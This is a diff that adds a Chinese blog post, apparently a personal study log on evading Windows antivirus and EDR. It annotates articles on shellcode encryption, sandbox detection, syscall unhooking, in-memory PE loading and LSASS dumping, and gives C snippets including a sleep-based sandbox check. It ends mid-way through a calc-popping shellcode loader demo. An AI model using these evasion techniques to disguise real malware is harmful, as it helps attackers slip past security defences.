@@ -1,0 +1,1067 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta name="referrer" content="no-referrer">
+
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="阅读文章，学习windows免杀技术">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023.7.17-window免杀技术【更新ing】">
+<meta property="og:url" content="http://example.com/2023/07/17/2023.7.17-window%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E3%80%90%E6%9B%B4%E6%96%B0ing%E3%80%91/index.html">
+<meta property="og:site_name" content="cht11">
+<meta property="og:description" content="阅读文章，学习windows免杀技术">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/cht1/Image/raw/master/image-20230728010035909.png">
+<meta property="og:image" content="http://example.com/AppData/Roaming/Typora/typora-user-images/image-20230803135035823.png">
+<meta property="og:image" content="https://gitee.com/cht1/Image/raw/master/image-20230731174231961.png">
+<meta property="og:image" content="https://gitee.com/cht1/Image/raw/master/image-20230731173849523.png">
+<meta property="og:image" content="http://example.com/AppData/Roaming/Typora/typora-user-images/image-20230803135035823.png">
+<meta property="og:image" content="https://gitee.com/cht1/Image/raw/master/image-20230803163354393.png">
+<meta property="article:published_time" content="2023-07-16T16:10:00.000Z">
+<meta property="article:modified_time" content="2023-08-04T10:37:32.374Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="window">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/cht1/Image/raw/master/image-20230728010035909.png">
+  
+  
+  
+  <title>2023.7.17-window免杀技术【更新ing】 - cht11</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"kzpnp7DNYwvboDPkXzmk2Q69-MdYXbMMI","app_key":"ireqQQri5PP8smjRpohD0gi9","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>cht11</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023.7.17-window免杀技术【更新ing】"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-17 00:10" pubdate>
+          2023年7月17日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          88 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2023.7.17-window免杀技术【更新ing】</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>描述：记录一些免杀技术的文章</p>
+<p>[]，是是</p>
+<span id="more"></span>
+
+
+
+<h1 id="2023-7-17-window免杀技术"><a href="#2023-7-17-window免杀技术" class="headerlink" title="2023.7.17-window免杀技术"></a>2023.7.17-window免杀技术</h1><p>[toc]</p>
+<h2 id="0x0-需求"><a href="#0x0-需求" class="headerlink" title="0x0-需求"></a>0x0-需求</h2><p>输入一个被杀软查杀的exe，输出一个免杀的exe</p>
+<p>即对exe免杀，不是对shellcode免杀</p>
+<h2 id="0x1-免杀知识"><a href="#0x1-免杀知识" class="headerlink" title="0x1-免杀知识"></a>0x1-免杀知识</h2><h3 id="看雪：静态恶意代码免杀"><a href="#看雪：静态恶意代码免杀" class="headerlink" title="看雪：静态恶意代码免杀 "></a><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-271207.htm">看雪：静态恶意代码免杀 </a></h3><blockquote>
+<ol>
+<li>恶意代码开发<ol>
+<li>前言：杀软检测工作原理+杀躲避检测技术</li>
+<li>基本知识</li>
+<li>过沙箱：检测虚拟化环境+虚拟环境中的特征值+检测当前环境运行的时间</li>
+<li>PE资源加载执行</li>
+<li>混淆：Shellcode亦或混淆加密、AES混淆加密</li>
+<li>分离</li>
+<li>注入：远线程注入+监控内存+APC注入</li>
+<li>隐藏导入表函数：Loadlibrary，</li>
+<li>最后</li>
+</ol>
+</li>
+</ol>
+<p>介绍了大部分免杀技术，大部分针对于shellcode，也包括沙箱逃逸的动态免杀。</p>
+<p>但每个技术点比较粗略，需要深入。</p>
+</blockquote>
+<h3 id="红队策略：结合直接系统调用和-sRDI-绕过-AV-x2F-EDR"><a href="#红队策略：结合直接系统调用和-sRDI-绕过-AV-x2F-EDR" class="headerlink" title="红队策略：结合直接系统调用和 sRDI 绕过 AV&#x2F;EDR"></a><a target="_blank" rel="noopener" href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">红队策略：结合直接系统调用和 sRDI 绕过 AV&#x2F;EDR</a></h3><blockquote>
+<p> <a target="_blank" rel="noopener" href="https://outflank.nl/blog/author/cornelis/">科内利斯</a> | 2019 年 6 月 19 日</p>
+<p> 在这篇博文中，我们将探讨直接系统调用的使用、恢复挂钩的 API 调用，并最终将其与称为sRDI的 shellcode 注入技术结合起来 。我们将在概念验证代码中结合这些技术，该代码可用于使用 Cobalt Strike 创建 LSASS 内存转储，同时不接触磁盘并逃避 AV&#x2F;EDR 监控的用户模式 API 调用。</p>
+<p> 我：大概是通过ntdll.dll，直接获取内核API，防止用户层API钩子的检测</p>
+<p> kenel32.dll</p>
+<p> ntdll.dll</p>
+</blockquote>
+<h3 id="2022年工业级EDR绕过蓝图"><a href="#2022年工业级EDR绕过蓝图" class="headerlink" title="2022年工业级EDR绕过蓝图"></a><a target="_blank" rel="noopener" href="https://www.ctfiot.com/74765.html">2022年工业级EDR绕过蓝图</a></h3><blockquote>
+<p>这篇博客中会涉及如下的技术用于最终执行我们的恶意shellcode，或者说是实现shellcode加载器：</p>
+<ol>
+<li><p>Shellcode 加密</p>
+</li>
+<li><p>减少熵值：shellcode加密数据熵值高，图像数据、英文字符熵值低</p>
+</li>
+<li><p>绕过AV沙盒：环境检测、延时执行</p>
+</li>
+<li><p>导入表混淆：隐藏API调用，绕过API灰名单</p>
+</li>
+<li><p>禁用ETW：？，ETW事件跟踪，内核API实现，可禁用</p>
+</li>
+<li><p>绕过常见的恶意API调用模式</p>
+</li>
+<li><p>直接系统调用，或者说规避syscall的监控：从ntdll.dll获取内核API</p>
+</li>
+<li><p>移除ntdll.dll中的hook：覆盖ntdll.dll</p>
+</li>
+<li><p>伪造线程调用栈：？</p>
+</li>
+<li><p>beacon内存加密：？权限读取，hook掉sleep函数，添加VEH处理链，睡眠钱将shellcode加密、内存为不可执行，执行shellcode触发VEH异常，由VEH处理函数解密shellcode以及修改内存为可执行。</p>
+<p>注意：很多杀软会对sleep进行识别，因为正常文件一般不用用sleep</p>
+</li>
+<li><p>自定义反射式加载：反射式DLL注入</p>
+</li>
+<li><p>Malleable profile中的OpSec 配置</p>
+</li>
+</ol>
+<p>我：主要是针对shellcode或恶意代码本身</p>
+<p>相似文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jentle8/article/details/126771022">AV&#x2F;EDR 免杀逃避技术汇总</a>：通俗的语言，并且每个方法都给了github链接</p>
+</blockquote>
+<h3 id="静态免杀"><a href="#静态免杀" class="headerlink" title="静态免杀"></a><a target="_blank" rel="noopener" href="https://profesmoriarty.github.io/posts/bypass.html">静态免杀</a></h3><blockquote>
+<p>主要介绍shellcode加载方式，利用动态加载API（LoadLibrary+GetProcAddr）来逃避导入表的检测。</p>
+<p>其中LoadLibrary和GetProcAddr可以手动解析kernel32.dll获取</p>
+<p>疑惑点：如果沙箱hook掉kernel32.dll中的这些API，那我们手动解析+动态加载依然会被检测。</p>
+<p>但文章也说：只是bypass静态免杀，有一定效果</p>
+</blockquote>
+<h3 id="exe、shellcode免杀-完美绕过360"><a href="#exe、shellcode免杀-完美绕过360" class="headerlink" title="exe、shellcode免杀 完美绕过360"></a><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2129786">exe、shellcode免杀 完美绕过360</a></h3><blockquote>
+<p>github上的项目，linux（kali）上运行，对<strong>exe</strong>和shelcode进行免杀处理，生成新的exe或shellcode</p>
+<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/lengjibo/FourEye">https://github.com/lengjibo/FourEye</a></p>
+<p>已测试，能成功（x86&#x2F;x64）。但是生成的软件（linux编译，体积较大），win10上能运行，win7上失败（可能我win7的问题）</p>
+<p>目前<strong>火绒</strong>已对其标记，<strong>360免杀</strong>。</p>
+</blockquote>
+<h3 id="PEzor"><a href="#PEzor" class="headerlink" title="PEzor"></a><a target="_blank" rel="noopener" href="https://github.com/phra/PEzor">PEzor</a></h3><blockquote>
+<p>这个工具也可以对exe进行免杀处理</p>
+<p>但是使用比较复杂，而且我没有安装成功，直接把kali搞坏重装了。。。</p>
+</blockquote>
+<h3 id="免杀任意EXE"><a href="#免杀任意EXE" class="headerlink" title="免杀任意EXE"></a><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/278200.html">免杀任意EXE</a></h3><blockquote>
+<p>实际上就是<strong>内存加载</strong>，模拟系统加载exe</p>
+<p>过程：</p>
+<ol>
+<li>将PE文件按照内存对齐映射到内存</li>
+<li>修复IAT表</li>
+<li>修复重定位表</li>
+<li>更改内存区域为可执行，跳转到程序OEP</li>
+</ol>
+</blockquote>
+<h3 id="免杀基础入门篇"><a href="#免杀基础入门篇" class="headerlink" title="免杀基础入门篇"></a><a target="_blank" rel="noopener" href="https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/">免杀基础入门篇</a></h3><blockquote>
+<p>静态查杀-&gt;免杀方法:<br>动态查杀（主动防御）<br>一些免杀技巧：计算机相关、网络相关、payload基本结构、分离免杀<br>总结：免杀要打组合拳</p>
+<p>我：入门性文章，讲了一些基础性概念，免杀主要讲静态查杀，未涉及沙箱。</p>
+<p>文中涉及的shellcode免杀，包括内存加载，有被EDR查杀的情况，实际上是被本地沙箱查杀了（文中没写）。</p>
+<p>文中提到的<strong>网络通信</strong>不太会、<strong>stager</strong>不懂。</p>
+</blockquote>
+<h3 id="那些shellcode免杀总结"><a href="#那些shellcode免杀总结" class="headerlink" title="那些shellcode免杀总结"></a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7170">那些shellcode免杀总结</a></h3><blockquote>
+<p>shellcode”分离”免杀：加载器执行shellcode、Lolbins白利用加载shellcode<br>shellcode”混淆”免杀：shellcode编码混淆（使用模板和编码器）、shellcode注入混淆</p>
+<p>我：本文主要针对shellcode的免杀，无外乎分离、混淆。含代码C、python、C#、powershell。</p>
+<p>混淆只能过静态免杀、分离可过沙箱免杀。</p>
+</blockquote>
+<h3 id="CS免杀-剪切板加载器"><a href="#CS免杀-剪切板加载器" class="headerlink" title="CS免杀-剪切板加载器"></a><a target="_blank" rel="noopener" href="https://forum.butian.net/share/711">CS免杀-剪切板加载器</a></h3><blockquote>
+<p>利用windows API <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-registerclipboardformatw">RegisterClipboardFormat</a>和<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboardformatnamew">GetClipboardFormatName </a>，进行内存加载shellcode免杀</p>
+<p>同样是shellcode免杀，python作为加载器。</p>
+<p>文章含源码，从msf获取的shellcode，利用python的ctypes调用win API进行内存加载。</p>
+<p>实测可用，win7测试可用。</p>
+<p>利用cmd命令<code>pyinstaller -F -w test.py</code>，打包生成test.exe，能过360查杀，不能过火绒（本地沙箱，被动态查杀）</p>
+<ul>
+<li><p>（执行py文件，不会被火绒动态查杀！！）</p>
+<p>可以用过cpp调用命令行执行py文件，来免杀。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>                          <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>	system(<span class="hljs-string">&quot;test.py&quot;</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>属于<strong>shellcode分离</strong>免杀，实际效果可能不好，因为不保证目标机器有python环境。</p>
+</li>
+</ul>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zl834205311/article/details/125905705">python文件打包成可执行文件exe的两种方法</a></p>
+</blockquote>
+<h3 id="From-Memory-Loading-to-Everything-Part-1"><a href="#From-Memory-Loading-to-Everything-Part-1" class="headerlink" title="From Memory Loading to Everything - Part 1"></a><a target="_blank" rel="noopener" href="https://citrusice.github.io/posts/from-memory-loading-to-everyting-part-1/">From Memory Loading to Everything - Part 1</a></h3><blockquote>
+<p>讲了内存加载的两点注意事项：</p>
+<ul>
+<li><p>将内存加载的模块设置为主模块</p>
+<p>需要修改 <code> (HMODULE)(PVOID)NtCurrentPeb()-&gt;ImageBaseAddress</code>以及LDR链上的EXE模块基址</p>
+</li>
+<li><p>修改TLS 表</p>
+<p>这个没细看，不太懂……</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="木马杂谈"><a href="#木马杂谈" class="headerlink" title="木马杂谈"></a><a target="_blank" rel="noopener" href="https://citrusice.github.io/posts/something-ablout-malware/">木马杂谈</a></h3><blockquote>
+<p>以红队的角度，谈木马，更底层，一些杂谈，挺不错。</p>
+<ul>
+<li>bypass主动防御、权限维持</li>
+<li>Fully UnDetectable - 木马的伪装与特征隐藏</li>
+<li>anti analysis</li>
+<li>关于语言选择</li>
+</ul>
+</blockquote>
+<h3 id="使用内存加载躲避静态查杀"><a href="#使用内存加载躲避静态查杀" class="headerlink" title="使用内存加载躲避静态查杀"></a><a target="_blank" rel="noopener" href="https://citrusice.github.io/posts/memory-execute/">使用内存加载躲避静态查杀</a></h3><blockquote>
+<p>重点讨论exe内存加载的过程</p>
+<p>其中谈到几点：</p>
+<ul>
+<li>如何加载<strong>无重定位表的PE</strong>：将加载器的ImageBase设为其他地址，为没有重定位表的pe程序让出空间，随后用virtualloc在目标pe程序的默认基址处开辟一块内存用来放置目标pe程序</li>
+<li>加载<strong>带命令行参数的exe</strong>：修改传递给被加载程序的命令行参数。如果只是加载一些木马就不需要考虑命令行参数的问题。</li>
+</ul>
+</blockquote>
+<h3 id="防止第-3-方-DLL-注入您的恶意软件"><a href="#防止第-3-方-DLL-注入您的恶意软件" class="headerlink" title="防止第 3 方 DLL 注入您的恶意软件"></a><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/defense-evasion/preventing-3rd-party-dlls-from-injecting-into-your-processes">防止第 3 方 DLL 注入您的恶意软件</a></h3><blockquote>
+<p>通过 Windows 阻止非 Microsoft 签名的二进制文件注入到该进程中的方式启动新进程。</p>
+<p>利用Win API：</p>
+<ul>
+<li><p>作用于创建的子进程：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute">UpdateProcThreadAttribute</a>，设置一个属性<code>PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY</code>，</p>
+<p>只能</p>
+</li>
+<li><p>可以作用于本进程：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setprocessmitigationpolicy">SetProcessMitigationPolicy</a>，在调用API初始化之后，可实现效果。</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="ALaris-shellcode免杀loader的技术原理"><a href="#ALaris-shellcode免杀loader的技术原理" class="headerlink" title="ALaris shellcode免杀loader的技术原理"></a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9723">ALaris shellcode免杀loader的技术原理</a></h3><blockquote>
+<p>记录了一些C实现的windows免杀技术，参考的github项目：<a target="_blank" rel="noopener" href="https://github.com/cribdragg3r/Alaris">https://github.com/cribdragg3r/Alaris</a></p>
+<ul>
+<li>防止第三方DLL注入<br>Syscall<br>进程注入手段<br>APC注入在实战中的场景<br>shellcode加密<br>父进程欺骗<br>执行后覆盖自身shellcode<br>隐藏启动窗口<br>查杀规则</li>
+</ul>
+<p>很实战，有效果</p>
+</blockquote>
+<h3 id="免杀技术-使用纤程免杀"><a href="#免杀技术-使用纤程免杀" class="headerlink" title="免杀技术-使用纤程免杀"></a><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2248504">免杀技术-使用纤程免杀</a></h3><blockquote>
+<p>来此于b站视频：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1LA411B7Mk/?spm_id_from=333.999.0.0&vd_source=d1c17238fa5d3ad3b5a69292b0d905a4">小白也能学:利用纤程快速免杀Defender、360、卡巴斯基</a></p>
+<p>细节没看，文章里有一些不错的免杀代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;Comdlg32.lib&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span><br><br><span class="hljs-comment">//阻止除微软签名的代码，注入该进程</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BLockDll</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">//定义一个标志</span><br>    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = &#123;&#125;;<br>    sp.MicrosoftSignedOnly = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//调用进程设置缓解策略。 缓解策略使流程能够加强自身以抵御各种类型的攻击</span><br>    <span class="hljs-comment">//ProcessSignaturePolicy意思就是限制为只能加载微软签名的</span><br>    SetProcessMitigationPolicy(ProcessSignaturePolicy, &amp;sp, <span class="hljs-keyword">sizeof</span>(sp));<br>&#125;<br><br><span class="hljs-type">bool</span> 检查沙箱()<br>&#123;<br>    <span class="hljs-type">clock_t</span> start = clock();<br><br>    Sleep(<span class="hljs-number">2000</span>);<br><br>    <span class="hljs-type">clock_t</span> end = clock();<br>    <span class="hljs-keyword">if</span> (end - start &gt;= <span class="hljs-number">2000</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+</blockquote>
+<h2 id="0x2-免杀总结"><a href="#0x2-免杀总结" class="headerlink" title="0x2-免杀总结"></a>0x2-免杀总结</h2><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>以上大部分都是对shellcode的免杀，或者是恶意代码exe在开发过程中进行免杀代码编写；</p>
+<p>而对现成的exe免杀生成新的exe，达到免杀处理，这种较少。</p>
+<p>exe免杀：</p>
+<ol>
+<li><p><strong>定位exe被杀软检测的特征码，更改</strong></p>
+<p><strong>具体操作</strong>：使用工具、手动。（没细看）</p>
+<p><strong>缺点</strong>：只能修改一些无用信息 例如字符串之类的，若修改代码的字节码，需慎重。</p>
+</li>
+<li><p><strong>内存加载：PELoader加载整个exe</strong></p>
+<p><strong>具体操作</strong>：把exe作为shellcode，进行加密保存 到PELoad得新建节区，PELoader负责解密并加载运行。同时，可以有种加密解密的PELoader对应exe，放在后台。</p>
+<p><strong>缺点</strong>：比较笨重。（优点：主流 exe免杀过杀软的方法，对shellcode的免杀方法很多）</p>
+</li>
+<li><p><strong>exe加壳</strong></p>
+<p><strong>具体操作</strong>：使用开源壳加壳工具，或者自己写的壳。</p>
+<p><strong>缺点</strong>：常见壳容易被杀软标记。</p>
+</li>
+</ol>
+<p>免杀，程序伪装得越简单越好。越复杂，杀软分析不了，就会各项值打高分，达到预定值就报毒。</p>
+<p>此外，<strong>还有一种免杀方式：shelcode、加载器分离</strong>，分为两个文件，这样大概率是免杀，同时过沙箱（沙箱运行环境中不存在分离的shellcode，故启动失败），参考文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7170">先知社区：那些shellcode免杀总结</a></p>
+<p>下图来自于：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1mY411e7jF/?spm_id_from=333.999.0.0&vd_source=d1c17238fa5d3ad3b5a69292b0d905a4">B站：聊聊EDR对抗</a></p>
+<p><img src="https://gitee.com/cht1/Image/raw/master/image-20230728010035909.png" srcset="/img/loading.gif" lazyload alt="image-20230728010035909"></p>
+<h2 id="0x3-实现exe免杀demo-exe内存加载"><a href="#0x3-实现exe免杀demo-exe内存加载" class="headerlink" title="0x3-实现exe免杀demo_exe内存加载"></a>0x3-实现exe免杀demo_exe内存加载</h2><h3 id="1-生成测试木马exe"><a href="#1-生成测试木马exe" class="headerlink" title="1-生成测试木马exe"></a>1-生成测试木马exe</h3><p>测试木马exe：一个shellcode加载器。（shellcode弹出计算器）</p>
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-comment">#include&lt;windows.h&gt;</span><br>int <span class="hljs-title function_">main</span>(<span class="hljs-params">int</span> <span class="hljs-params">argc</span>, <span class="hljs-params">char</span> **<span class="hljs-params">argv</span>)<br>&#123;<br>    <span class="hljs-variable">unsigned</span> <span class="hljs-variable">char</span> <span class="hljs-variable">buf</span>[] <span class="hljs-operator">=</span><br>        <span class="hljs-string">&quot;\xfc\xe8<span class="hljs-char escape_">\x82</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x60</span><span class="hljs-char escape_">\x89</span>\xe5<span class="hljs-char escape_">\x31</span>\xc0<span class="hljs-char escape_">\x64</span>\x8b<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x30</span>&quot;</span><br>        <span class="hljs-string">&quot;\x8b<span class="hljs-char escape_">\x52</span>\x0c\x8b<span class="hljs-char escape_">\x52</span><span class="hljs-char escape_">\x14</span>\x8b<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x28</span>\x0f\xb7\x4a<span class="hljs-char 